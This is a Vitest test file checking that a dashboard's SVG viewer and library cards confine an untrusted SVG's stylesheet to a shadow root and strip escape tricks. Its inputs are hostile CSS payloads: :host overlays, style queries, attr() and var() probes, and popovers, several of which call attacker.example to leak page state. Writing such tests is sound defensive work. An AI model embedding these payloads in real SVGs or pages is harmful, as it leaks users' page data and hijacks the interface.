// @vitest-environment jsdom
//
// jsdom, not the suite-default happy-dom: happy-dom's parser drops an <svg>'s
// <style> and everything after it, so the test could not see the stylesheet.
// jsdom does not apply an SVG <style> to computed styles, so this pins where the
// stylesheet lives: inside the SVG's own shadow root, never in the page. The
// browser check (the fill renders, the page and its print stay as they were) is
// in website/playwright/artifacts.spec.ts.
//
// jsdom has no parser for constructable stylesheets, which SvgShadow uses to
// keep the drawing's own rules (components/svgStylesheet.ts); happy-dom's
// stands in for the browser's.
import { render } from '@testing-library/react'
import { Window } from 'happy-dom'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
import { SvgViewer } from '../components/FileRenderers'
import { ContentThumb } from '../components/library/ArtifactThumbs'

const STYLED_SVG = '<svg width="8" height="8"><style>.st0 { fill: red } body { color: red !important }</style><circle class="st0" r="4" /></svg>'

const cssParser = new Window()
beforeAll(() => { vi.stubGlobal('CSSStyleSheet', cssParser.CSSStyleSheet) })
afterAll(() => { vi.unstubAllGlobals(); void cssParser.happyDOM.close() })

const surfaces = (svg: string) => [
  ['the viewer', <SvgViewer key="viewer" content={svg} />],
  ['the library card', <ContentThumb key="card" content={svg} kind="svg" />],
] as const

function drawn(svg: JSX.Element) {
  const { container } = render(svg)
  const host = container.querySelector<HTMLElement>('[data-guide-untrusted]')
  return { host, sheet: host?.shadowRoot?.querySelector('svg style')?.textContent ?? '' }
}

describe("an SVG artifact's own stylesheet styles only that SVG", () => {
  it.each(surfaces(STYLED_SVG))('%s keeps the stylesheet with the shapes, inside the shadow root', (_where, svg) => {
    const { container } = render(svg)
    const shadow = container.querySelector('[data-guide-untrusted]')?.shadowRoot
    expect(shadow?.querySelector('svg style')?.textContent).toContain('.st0')
    expect(shadow?.querySelector('svg circle.st0')).not.toBeNull()
    expect(document.querySelector('style')).toBeNull()
    expect(Array.from(document.styleSheets).flatMap(sheet => Array.from(sheet.cssRules, rule => rule.cssText))).toEqual([])
  })

  // GPT 6.1 Review on #33084: a `:host` rule restyled the dashboard-owned host
  // into a fixed overlay over the page.
  it.each(surfaces('<svg width="8" height="8"><style>.st0 { fill: red } :host { position: fixed !important; inset: 0 !important; z-index: 2147483647 !important }</style><circle class="st0" r="4" /></svg>'))(
    '%s drops a :host rule, so the stylesheet cannot style the host', (_where, svg) => {
      const { sheet } = drawn(svg)
      expect(sheet).toContain('.st0')
      expect(sheet).not.toMatch(/:host/i)
    },
  )

  // #33251: a `:host-context()` rule matched on page state outside the shadow
  // root and fetched a remote image as the signal.
  it.each(surfaces('<svg width="8" height="8"><style>.st0 { fill: red } :host-context(body) svg { background-image: url("https://attacker.example/c") }</style><circle class="st0" r="4" /></svg>'))(
    '%s drops a :host-context rule, so the stylesheet cannot read the page around it', (_where, svg) => {
      const { sheet } = drawn(svg)
      expect(sheet).toContain('.st0')
      expect(sheet).not.toContain('attacker.example')
    },
  )

  // A container style query reads the computed style of the host's ancestors,
  // such as the page's theme variables, and fetches a remote image as the signal.
  it.each(surfaces('<svg width="8" height="8"><style>.st0 { fill: red } @container style(--accent: #a6e22e) { svg { background-image: url("https://attacker.example/theme") } }</style><circle class="st0" r="4" /></svg>'))(
    '%s drops a container style query, so the stylesheet cannot read the page around it', (_where, svg) => {
      const { sheet } = drawn(svg)
      expect(sheet).toContain('.st0')
      expect(sheet).not.toContain('attacker.example')
    },
  )

  // GPT 6.1 Review on #33333: the same query as an escaped `if(style(...))` in a
  // custom property, which keeps its escapes as typed.
  it.each(surfaces(String.raw`<svg width="8" height="8"><style>.st0 { fill: red } svg { --probe: \69 f(\73 tyle(--accent: #00d492): url("https://attacker.example/dark"); else: none); background-image: var(--probe) }</style><circle class="st0" r="4" /></svg>`))(
    '%s drops an escaped style query, so the stylesheet cannot read the page around it', (_where, svg) => {
      const { sheet } = drawn(svg)
      expect(sheet).toContain('.st0')
      expect(sheet).not.toContain('attacker.example')
    },
  )

  // GPT 6.1 and Opus 5.5 Review on #33333: the same query in an element's own
  // `style` attribute, which no stylesheet holds.
  it.each(surfaces('<svg width="8" height="8"><circle class="st0" r="4" style="fill: blue" /><rect width="8" height="8" style="background-image: if(style(--accent: #00d492): url(https://attacker.example/dark); else: none)" /></svg>'))(
    '%s drops a style attribute holding a style query, and keeps a plain one', (_where, svg) => {
      const { host } = drawn(svg)
      expect(host?.shadowRoot?.querySelector('rect')?.hasAttribute('style')).toBe(false)
      expect(host?.shadowRoot?.querySelector('circle')?.getAttribute('style')).toContain('fill')
    },
  )

  // GPT 6.1 Review on #33333: escapes ended by a CRLF in a style attribute, which
  // the browser reads as `if(style(...))`.
  it.each(surfaces('<svg width="8" height="8"><rect width="8" height="8" style="background-image:\\69&#13;&#10;f(\\73&#13;&#10;tyle(--accent:#00d492):url(https://attacker.example/dark);else:none)" /></svg>'))(
    '%s drops a style attribute holding an escaped style query', (_where, svg) => {
      const { host } = drawn(svg)
      expect(host?.shadowRoot?.querySelector('rect')?.hasAttribute('style')).toBe(false)
    },
  )

  // Opus 5.5 Review on #33333: `attr()` reads a `data-*` attribute back as CSS,
  // bringing in an `if(style(...))` no stylesheet or `style` attribute holds.
  it.each(surfaces('<svg width="8" height="8" data-d="if(style(--accent: #00d492): block; else: none)"><style>.st0 { fill: red } svg { display: attr(data-d type(*)); background-image: url("https://attacker.example/dark") }</style><circle class="st0" r="4" style="fill: blue; display: attr(data-d type(*))" /></svg>'))(
    '%s drops a declaration using attr(), in a stylesheet and in a style attribute', (_where, svg) => {
      const { host, sheet } = drawn(svg)
      expect(sheet).toContain('.st0')
      expect(sheet).not.toContain('attr(')
      const circle = host?.shadowRoot?.querySelector('circle')?.getAttribute('style') ?? ''
      expect(circle).toContain('fill')
      expect(circle).not.toContain('attr(')
    },
  )

  // Opus 5.5 Review (local) on #33333: SVG reads `fill="..."` and its kin as CSS,
  // so a presentation attribute can hold the same `if(style(...))`.
  it.each(surfaces('<svg width="8" height="8"><rect width="8" height="8" fill="if(style(--accent: red): url(https://attacker.example/x#a); else: blue)" /><circle r="4" fill="red" transform="translate(1 2)" /></svg>'))(
    '%s drops a presentation attribute using a function a drawing does not need', (_where, svg) => {
      const { host } = drawn(svg)
      expect(host?.shadowRoot?.querySelector('rect')?.hasAttribute('fill')).toBe(false)
      expect(host?.shadowRoot?.querySelector('circle')?.getAttribute('transform')).toBe('translate(1 2)')
    },
  )

  // Opus 5.5 Review (local) on #33333: a `var()` fallback, or an empty value,
  // tests whether the page defines a custom property.
  it.each(surfaces('<svg width="8" height="8"><style>.st0 { fill: red; stroke: var(--flag, url("https://attacker.example/flag")) }</style><circle class="st0" r="4" style="fill: blue; stroke: var(--flag, url(https://attacker.example/attr))" /></svg>'))(
    '%s drops a declaration using var()', (_where, svg) => {
      const { host, sheet } = drawn(svg)
      expect(sheet).toContain('.st0')
      expect(sheet).not.toContain('attacker.example')
      expect(host?.shadowRoot?.querySelector('circle')?.getAttribute('style')).not.toContain('attacker.example')
    },
  )

  // Opus 5.5 Review (local) on #33333: HTML kept beside the SVG, such as a
  // popover, opens in the top layer, over the page and past the containment.
  it.each(surfaces('<svg width="8" height="8"><circle r="4" /></svg><button popovertarget="x">b</button><div id="x" popover style="inset: 0">p</div>'))(
    '%s keeps SVG markup only, so no popover can open over the page', (_where, svg) => {
      const { host } = drawn(svg)
      expect(host?.shadowRoot?.querySelector('circle')).not.toBeNull()
      expect(host?.shadowRoot?.querySelector('[popover], [popovertarget], button, div')).toBeNull()
    },
  )

  // KiroCrewCaptain review on #33333: a newline cuts a quoted value off, and
  // joining the kept pieces would close that string over the next one.
  it.each(surfaces('<svg width="8" height="8"><circle r="4" style=\'a:"x&#10;;b:"; fill: var(--x, red); background-image: if(style(--theme: dark): url(https://attacker.example/x); else: none)\' /></svg>'))(
    '%s drops a style attribute with a string cut off by a newline', (_where, svg) => {
      const { host } = drawn(svg)
      expect(host?.shadowRoot?.querySelector('circle')?.hasAttribute('style')).toBe(false)
    },
  )

  // Opus 5.5 Review on #33333: a link, label or id is not CSS, so a `name(` in it stays.
  it.each(surfaces('<svg width="8" height="8" aria-label="Plot of f(x)"><a href="https://en.wikipedia.org/wiki/Mercury_(planet)"><circle r="4" fill="if(style(--a: b): red; else: blue)" /></a></svg>'))(
    '%s keeps a link and a label holding a name( and still checks a presentation attribute', (_where, svg) => {
      const { host } = drawn(svg)
      expect(host?.shadowRoot?.querySelector('svg')?.getAttribute('aria-label')).toBe('Plot of f(x)')
      expect(host?.shadowRoot?.querySelector('a')?.getAttribute('href')).toBe('https://en.wikipedia.org/wiki/Mercury_(planet)')
      expect(host?.shadowRoot?.querySelector('circle')?.hasAttribute('fill')).toBe(false)
    },
  )

  // Opus 5.5 Review on #33333: CSS reads `#url(` as a hash and a block, not a
  // url, so a string in it can hide a `var()` declaration from the check.
  it.each(surfaces('<svg width="8" height="8"><circle r="4" style=\'fill: blue; stroke: #url(a" ) " ); background-image: var(--accent, url(https://attacker.example/x)); --z: "\' /></svg>'))(
    '%s drops a style attribute with a #url( that hides a declaration', (_where, svg) => {
      const { host } = drawn(svg)
      expect(host?.shadowRoot?.querySelector('circle')?.getAttribute('style') ?? '').not.toContain('attacker.example')
    },
  )

  // Opus 5.5 Review on #33333: in `#url(/*)` the `/*` opens a comment for CSS,
  // which then hides the start of a string and leaves `var()` live.
  it.each(surfaces('<svg width="8" height="8"><rect width="8" height="8" style=\'fill: #url(/*); stroke: "*/); mask: var(--accent, url(https://attacker.example/x)); --z: "\' /></svg>'))(
    '%s drops a var() a comment in #url( would hide', (_where, svg) => {
      const { host } = drawn(svg)
      expect(host?.shadowRoot?.querySelector('rect')?.getAttribute('style') ?? '').not.toContain('attacker.example')
    },
  )

  // Whatever CSS adds next is not on the list of functions a drawing needs.
  it.each(surfaces('<svg width="8" height="8"><style>.st0 { fill: red; stroke: future-query(--accent) }</style><circle class="st0" r="4" style="fill: blue; opacity: future-query(--accent)" /></svg>'))(
    '%s drops a declaration using a function it does not know', (_where, svg) => {
      const { host, sheet } = drawn(svg)
      expect(sheet).toContain('.st0')
      expect(sheet).not.toContain('future-query')
      expect(host?.shadowRoot?.querySelector('circle')?.getAttribute('style')).not.toContain('future-query')
    },
  )

  // The same overlay without the host: a `position: fixed` <svg> lays itself
  // over the page unless the host contains it.
  it.each(surfaces(STYLED_SVG))('%s holds the drawing inside the host with layout and paint containment', (_where, svg) => {
    const { host } = drawn(svg)
    expect(host?.classList).toContain('contain-layout')
    expect(host?.classList).toContain('contain-paint')
  })
})
